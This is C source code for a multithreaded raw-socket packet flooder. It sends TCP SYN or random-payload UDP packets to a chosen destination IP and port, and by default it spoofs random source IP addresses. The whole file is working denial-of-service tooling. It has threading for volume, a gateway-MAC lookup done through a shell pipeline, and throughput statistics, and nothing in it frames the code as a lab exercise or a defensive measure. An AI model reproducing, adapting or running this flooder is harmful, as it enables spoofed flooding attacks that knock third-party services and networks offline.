#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <inttypes.h>
#include <getopt.h>
#include <pthread.h>
#include <string.h>
#include <time.h>

#include "include/csum.h"

#define MAX_PCKT_LENGTH 0xFFFF

// Command line structure.
char *interface;
char *sIP;
char *dIP;
uint16_t port;
uint64_t interval;
uint16_t threads;
uint16_t min;
uint16_t max;
uint64_t pcktCountMax;
time_t seconds;
int help = 0;
int tcp = 0;
int verbose = 0;
int internal = 0;

// Global variables.
uint8_t cont = 1;
time_t startTime;
uint8_t dMAC[ETH_ALEN];
uint64_t pcktCount = 0;
uint64_t totalData = 0;

struct thread_pcktinfo 
{
    uint64_t pcktCount;
    uint64_t totalData;
};

// Thread structure.
struct pthread_info
{
    char *interface;
    char *sIP;
    char *dIP;
    uint16_t port;
    uint64_t interval;
    uint16_t min;
    uint16_t max;
    uint64_t pcktCountMax;
    time_t seconds;
    int tcp;
    int verbose;
    int internal;

    time_t startingTime;
    uint8_t dMAC[ETH_ALEN];
};

void signalHndl(int tmp)
{
    cont = 0;
}

void GetGatewayMAC()
{
    char cmd[] = "ip neigh | grep \"$(ip -4 route list 0/0|cut -d' ' -f3) \"|cut -d' ' -f5|tr '[a-f]' '[A-F]'";

    FILE *fp =  popen(cmd, "r");

    if (fp != NULL)
    {
        char line[18];

        if (fgets(line, sizeof(line), fp) != NULL)
        {
            sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dMAC[0], &dMAC[1], &dMAC[2], &dMAC[3], &dMAC[4], &dMAC[5]);
        }

        pclose(fp);
    }
}

uint16_t randNum(uint16_t min, uint16_t max, unsigned int seed)
{
    return (rand_r(&seed) % (max - min + 1)) + min;
}

void *threadHndl(void *data)
{
    // Pass info.
    struct pthread_info *info = (struct pthread_info *)data;

    // Thread variables.
    uint8_t sMAC[ETH_ALEN];

    // Create sockaddr_ll struct.
    struct sockaddr_ll sin;

    // Fill out sockaddr_ll struct.
    sin.sll_family = PF_PACKET;
    sin.sll_ifindex = if_nametoindex(info->interface);
    sin.sll_protocol = htons(ETH_P_IP);
    sin.sll_halen = ETH_ALEN;

    // Initialize socket FD.
    int sockfd;

    // Attempt to create socket.
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("socket");

        pthread_exit(NULL);
    }

    // Receive the interface's MAC address (the source MAC).
    struct ifreq ifr;
    strcpy(ifr.ifr_name, info->interface);

    // Attempt to get MAC address.
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) != 0)
    {
        perror("ioctl");

        pthread_exit(NULL);
    }

    // Copy source MAC to necessary variables.
    memcpy(sMAC, ifr.ifr_addr.sa_data, ETH_ALEN);
    memcpy(sin.sll_addr, sMAC, ETH_ALEN);

    // Attempt to bind socket.
    if (bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) != 0)
    {
        perror("bind");

        pthread_exit(NULL);
    }

    // Loop.
    while (1)
    {
        // Create rand_r() seed.
        unsigned int seed = (unsigned int)pcktCount;

        // Get source port (random).
        uint16_t srcPort;

        srcPort = randNum(1024, 65535, seed);

        // Get destination port.
        uint16_t dstPort;

        // Check if port is 0 (random).
        if (info->port == 0)
        {
            dstPort = randNum(10, 65535, seed);
        }
        else
        {
            dstPort = info->port;
        }

        char IP[32];

        if (info->sIP == NULL)
        {
            // Spoof source IP as any IP address.
            uint16_t tmp[4];

            if (internal)
            {
                tmp[0] = randNum(10, 10, seed);
                tmp[1] = randNum(0, 254, seed);
                tmp[2] = randNum(0, 254, seed);
                tmp[3] = randNum(0, 254, seed);
            }
            else
            {
                tmp[0] = randNum(1, 254, seed);
                tmp[1] = randNum(0, 254, seed);
                tmp[2] = randNum(0, 254, seed);
                tmp[3] = randNum(0, 254, seed);
            }

            sprintf(IP, "%d.%d.%d.%d", tmp[0], tmp[1], tmp[2], tmp[3]);
        }
        else
        {
            memcpy(IP, info->sIP, strlen(info->sIP));
        }

        // Initialize packet buffer.
        char buffer[MAX_PCKT_LENGTH];

        // Create ethernet header.
        struct ethhdr *eth = (struct ethhdr *)(buffer);

        // Fill out ethernet header.
        eth->h_proto = htons(ETH_P_IP);
        memcpy(eth->h_source, sMAC, ETH_ALEN);
        memcpy(eth->h_dest, info->dMAC, ETH_ALEN);

        // Create IP header.
        struct iphdr *iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));

        // Fill out IP header.
        iph->ihl = 5;
        iph->version = 4;

        // Check for TCP.
        if (info->tcp)
        {
            iph->protocol = IPPROTO_TCP;
        }
        else
        {
            iph->protocol = IPPROTO_UDP;
        }
        
        iph->id = 0;
        iph->frag_off = 0;
        iph->saddr = inet_addr(IP);
        iph->daddr = inet_addr(info->dIP);
        iph->tos = 0x00;
        iph->ttl = 64;

        // Calculate payload length and payload.
        uint16_t dataLen = randNum(info->min, info->max, seed);

        // Initialize payload.
        uint16_t l4header = (iph->protocol == IPPROTO_TCP) ? sizeof(struct tcphdr) : sizeof(struct udphdr);
        unsigned char *data = (unsigned char *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr) + l4header);

        // Fill out payload with random characters.
        for (uint16_t i = 0; i < dataLen; i++)
        {
            *data = rand() % 255;
            *data++;
        }

        // Check protocol.
        if (iph->protocol == IPPROTO_TCP)
        {
            // Create TCP header.
            struct tcphdr *tcph = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));

            // Fill out TCP header.
            tcph->doff = 5;
            tcph->source = htons(srcPort);
            tcph->dest = htons(dstPort);
            tcph->ack_seq = 0;
            tcph->seq = 0;

            // Set SYN flag to 1.
            tcph->syn = 1;

            // Calculate length and checksum of IP header.
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + dataLen);
            iph->check = 0;
            iph->check = ip_fast_csum(iph, iph->ihl);

            // Calculate TCP header checksum.
            tcph->check = 0;
            tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, sizeof(struct tcphdr) + dataLen, IPPROTO_TCP, csum_partial(tcph, sizeof(struct tcphdr) + dataLen, 0));
        }
        else
        {
            // Create UDP header.
            struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));

            // Fill out UDP header.
            udph->source = htons(srcPort);
            udph->dest = htons(dstPort);
            udph->len = htons(sizeof(struct udphdr) + dataLen);

            // Calculate length and checksum of IP header.
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dataLen);
            iph->check = 0;
            iph->check = ip_fast_csum(iph, iph->ihl);

            // Calculate UDP header checksum.
            udph->check = 0;
            udph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, sizeof(struct udphdr) + dataLen, IPPROTO_UDP, csum_partial(udph, sizeof(struct udphdr) + dataLen, 0));
        }
        
        // Initialize variable that represents how much data we've sent.
        uint16_t sent;

        // Attempt to send data.
        if ((sent = sendto(sockfd, buffer, ntohs(iph->tot_len) + sizeof(struct ethhdr), 0, (struct sockaddr *)&sin, sizeof(sin))) < 0)
        {
            perror("send");

            continue;
        }

        pcktCount++;

        totalData += sent;

        // Verbose mode.
        if (info->verbose)
        {
            fprintf(stdout, "Sent %d bytes to destination. (%" PRIu64 "/%" PRIu64 ")\n", sent, pcktCount, info->pcktCountMax);
        }

        // Check if we should wait between packets.
        if (info->interval > 0)
        {
            usleep(info->interval);
        }

        // Check time elasped.
        if (info->seconds > 0)
        {
            time_t timeNow = time(NULL);
            
            if (timeNow >= (info->startingTime + info->seconds))
            {
                cont = 0;
            }
        }

        if (info->pcktCountMax != 0 && pcktCount >= info->pcktCountMax)
        {
            cont = 0;
        }
    }

    // Close socket.
    close(sockfd);

    // Free information.
    free(info);

    // Exit thread.
    pthread_exit(NULL);
}

// Command line options.
static struct option longoptions[] =
{
    {"dev", required_argument, NULL, 'i'},
    {"src", required_argument, NULL, 's'},
    {"dst", required_argument, NULL, 'd'},
    {"port", required_argument, NULL, 'p'},
    {"interval", required_argument, NULL, 1},
    {"threads", required_argument, NULL, 't'},
    {"min", required_argument, NULL, 2},
    {"max", required_argument, NULL, 3},
    {"count", required_argument, NULL, 'c'},
    {"time", required_argument, NULL, 6},
    {"verbose", no_argument, &verbose, 'v'},
    {"tcp", no_argument, &tcp, 4},
    {"internal", no_argument, &internal, 5},
    {"help", no_argument, &help, 'h'},
    {NULL, 0, NULL, 0}
};

void parse_command_line(int argc, char *argv[])
{
    int c;

    // Parse command line.
    while ((c = getopt_long(argc, argv, "i:d:t:vhs:p:c:", longoptions, NULL)) != -1)
    {
        switch(c)
        {
            case 'i':
                interface = optarg;

                break;

            case 's':
                sIP = optarg;

                break;

            case 'd':
                dIP = optarg;

                break;

            case 'p':
                port = atoi(optarg);

                break;

            case 1:
                interval = strtoll(optarg, NULL, 10);

                break;

            case 't':
                threads = atoi(optarg);

                break;

            case 2:
                min = atoi(optarg);

                break;

            case 3:
                max = atoi(optarg);

                break;

            case 'c':
                pcktCountMax = strtoll(optarg, NULL, 10);

                break;

            case 6:
                seconds = strtoll(optarg, NULL, 10);

                break;

            case 'v':
                verbose = 1;

                break;

            case 'h':
                help = 1;

                break;

            case '?':
                fprintf(stderr, "Missing argument.\n");

                break;
        }
    }
}

int main(int argc, char *argv[])
{
    // Set optional defaults.
    threads = get_nprocs();
    interval = 1000000;
    port = 0;
    min = 0;
    max = 1200;
    pcktCountMax = 0;
    seconds = 0;

    // Parse the command line.
    parse_command_line(argc, argv);

    // Check if help flag is set. If so, print help information.
    if (help)
    {
        fprintf(stdout, "Usage for: %s:\n" \
            "--dev -i => Interface name to bind to.\n" \
            "--src -s => Source address (none = random/spoof).\n"
            "--dst -d => Destination IP to send packets to.\n" \
            "--port -p => Destination port (0 = random port).\n" \
            "--interval => Interval between sending packets in micro seconds.\n" \
            "--threads -t => Amount of threads to spawn (default is host's CPU count).\n" \
            "--count -c => The maximum packet count allowed sent.\n" \
            "--time => Amount of time in seconds to run tool for.\n" \
            "--verbose -v => Print how much data we sent each time.\n" \
            "--min => Minimum payload length.\n" \
            "--max => Maximum payload length.\n" \
            "--tcp => Send TCP packet with SYN flag set instead of UDP packet.\n" \
            "--help -h => Show help menu information.\n", argv[0]);

        exit(0);
    }

    // Check if interface argument was set.
    if (interface == NULL)
    {
        fprintf(stderr, "Missing --dev option.\n");

        exit(1);
    }

    // Check if destination IP argument was set.
    if (dIP == NULL)
    {
        fprintf(stderr, "Missing --dst option\n");

        exit(1);
    }

    // Create pthreads.
    pthread_t pid[threads];

    // Get destination MAC address (gateway MAC).
    GetGatewayMAC();

    // Print information.
    fprintf(stdout, "Launching against %s:%d (0 = random) from interface %s. Thread count => %d and Time => %" PRIu64 " micro seconds.\n", dIP, port, interface, threads, interval);

    // Start time.
    startTime = time(NULL);

    // Loop thread each thread.
    for (uint16_t i = 0; i < threads; i++)
    {
        // Create new pthread info structure.
        struct pthread_info *info = malloc(sizeof(struct pthread_info));

        // Copy values over.
        info->interface = interface;
        info->sIP = sIP;
        info->dIP = dIP;
        info->port = port;
        info->max = max;
        info->min = min;
        info->pcktCountMax = pcktCountMax;
        info->seconds = seconds;
        info->verbose = verbose;
        info->tcp = tcp;
        info->internal = internal;
        info->startingTime = startTime;
        memcpy(info->dMAC, dMAC, ETH_ALEN);

        if (pthread_create(&pid[i], NULL, threadHndl, (void *)info) != 0)
        {
            fprintf(stderr, "Error spawning thread %" PRIu16 "...\n", i);
        }
    }

    // Signal.
    signal(SIGINT, signalHndl);
    
    // Loop!
    while (cont)
    {
        sleep(1);
    }

    // End time.
    time_t endTime = time(NULL);

    // Wait a second for cleanup.
    sleep(1);

    // Statistics
    time_t totalTime = endTime - startTime;
    uint64_t pps = pcktCount / (uint64_t)totalTime;
    uint64_t MBTotal = totalData / 1000000;
    uint64_t MBsp = (totalData / (uint64_t)totalTime) / 1000000;
    uint64_t mbTotal = totalData / 125000;
    uint64_t mbps = (totalData / (uint64_t)totalTime) / 125000;

    // Print statistics.
    fprintf(stdout, "Finished in %lu seconds.\n\n", totalTime);

    fprintf(stdout, "Packets Total => %" PRIu64 ".\nPackets Per Second => %" PRIu64 ".\n\n", pcktCount, pps);
    fprintf(stdout, "Megabytes Total => %" PRIu64 ".\nMegabytes Per Second => %" PRIu64 ".\n\n", MBTotal, MBsp);
    fprintf(stdout, "Megabits Total => %" PRIu64 ".\nMegabits Per Second => %" PRIu64 ".\n\n", mbTotal, mbps);

    // Exit program successfully.
    exit(0);
}